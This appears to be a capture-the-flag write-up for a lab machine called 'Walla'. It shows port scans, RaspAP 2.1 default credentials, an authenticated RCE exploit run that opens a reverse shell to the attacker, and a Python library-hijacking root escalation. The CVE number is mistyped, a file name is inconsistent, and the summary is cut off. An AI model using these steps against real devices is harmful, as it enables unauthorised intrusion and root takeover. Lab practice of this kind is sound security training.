---
Alias: Walla
Date: {{date}}
Platform: Linux
Difficulty: Intermediate
Tags: #RaspAPWiFiConfigurationPortal 
Status: Finished
IP: 192.168.97.97
---

# {{Walla}}


# Resolution summary
- Found a package.json file on port 8091
- Navigated to the json file and found the target machine to be running raspAP Wifi Configuration Portal version 2.1
- Googled raspAP Wifi Configuration Portal default credentials
- Googled RaspAP 2.1 exploit github and found authenticated RCE CVE-20202-24572
- Input default credentials in the exploit script; ran it and received a reverse shell
- Found www-data can run wifi_reset.py as sudo
- Ran the script and received an error stating unable to load wificontroller module
- Typed python -c 'import sys; print(sys.path)' to receive a  list of directories that Python looks in when importing modules
- Confirmed it looks in the current directory first
- Created a file named "wificontroller.py" on kali machine with the following contents "import os 
   os.system('/bin/bash')"
- Transferred controller.py to the target machine in the "/home/directory"
- Ran the sc

## Improved skills
- skill 1
- skill 2

## Used tools
- nmap
- rustscan
- feroxbuster

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.97.97 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.97.97:22
Open 192.168.97.97:23
Open 192.168.97.97:25
Open 192.168.97.97:53
Open 192.168.97.97:422
Open 192.168.97.97:8091
Open 192.168.97.97:42042
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 09:37 EDT
Initiating Ping Scan at 09:37
Scanning 192.168.97.97 [2 ports]
Completed Ping Scan at 09:37, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:37
Completed Parallel DNS resolution of 1 host. at 09:37, 0.04s elapsed
DNS resolution of 1 IPs took 0.14s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:37
Scanning 192.168.97.97 [7 ports]
Discovered open port 23/tcp on 192.168.97.97
Discovered open port 22/tcp on 192.168.97.97
Discovered open port 25/tcp on 192.168.97.97
Discovered open port 53/tcp on 192.168.97.97
Discovered open port 422/tcp on 192.168.97.97
Discovered open port 8091/tcp on 192.168.97.97
Discovered open port 42042/tcp on 192.168.97.97
Completed Connect Scan at 09:37, 0.09s elapsed (7 total ports)
Nmap scan report for 192.168.97.97
Host is up, received conn-refused (0.093s latency).
Scanned at 2022-05-22 09:37:49 EDT for 0s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
23/tcp    open  telnet  syn-ack
25/tcp    open  smtp    syn-ack
53/tcp    open  domain  syn-ack
422/tcp   open  ariel3  syn-ack
8091/tcp  open  jamlink syn-ack
42042/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds


nmap -sC -sV -p 22,23,25,53,422,8091,42042 192.168.97.97
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 10:00 EDT
Nmap scan report for 192.168.97.97
Host is up (0.084s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36
|_ssl-date: TLS randomness does not represent time
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
|_http-server-header: lighttpd/1.4.53
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.50 seconds
```

Enumerated open TCP ports:
```bash
8091
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8091 - HTTP lighttpd 1.4.53

#### -Per the nmap scan I navigated to web page on "http://192.168.97.97:8091/"

#### -The page prompted me for a username and password to login

#### -I then ran a feroxbuster scan and found "http://192.168.97.97:8091/package.json"

![](Pasted%20image%2020221111091657.png)

#### -Navigated to the found .json page and found it was running "RaspAP WiFi Configuration Portal version 2.1"
#RaspAPWiFiConfigurationPortal 

![](Pasted%20image%2020221111091753.png)

#### -Googled "RaspAP WiFi Configuration Portal default credentials" and found it to be username "admin" password "secret"

![](Pasted%20image%2020221111091832.png)

#### -Googled "RaspAP 2.1 exploit github" and found the following exploit script for Authenticated RCE

![](Pasted%20image%2020221111091906.png)

![](Pasted%20image%2020221111092041.png)

---

# Exploitation
## CVE-20202-24572-POC - RaspAP 2.1 Authenticated RCE

#### -Copied the found exploit into a file on my kali machine named "exploit.py"

#### - Started a penelope listener listening on port 8091

#### -Typed "python3 exploit.py 192.168.97.97 8091 [my kali ip] 8091 secret 1" 

![](Pasted%20image%2020221111092314.png)

#### -Navigated back to penelope listener and received a reverse shell as wwwdata:

![](Pasted%20image%2020221111092345.png)

---

# Privilege Escalation
## Python Library Hijacking 

#### -Typed "sudo -l" and found www-data can run the following commands as sudo:

    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service

![](Pasted%20image%2020221111092853.png)

#### -Typed "python wifi_reset.py" and I received the following output:

![](Pasted%20image%2020221111093000.png)

#### -Typed "python -c 'import sys; print(sys.path)'" to receive a  list of directories that Python looks in when importing modules. Received the following output showing it looks in the current directory first:
![](Pasted%20image%2020221111093133.png)

## Privilege Escalation vector

#### -Created a file named "wificontroller.py" on my kali machine with the following: 
import os 
os.system('/bin/bash')
#PythonLibraryHijackingPrivilegeEscalation

#### -Transferred controller.py to the target machine in the "/home/directory"

#### -Typed "sudo /usr/bin/python /home/walter/wifi_reset.py" and received a root shell:

![](Pasted%20image%2020221111093244.png)

---
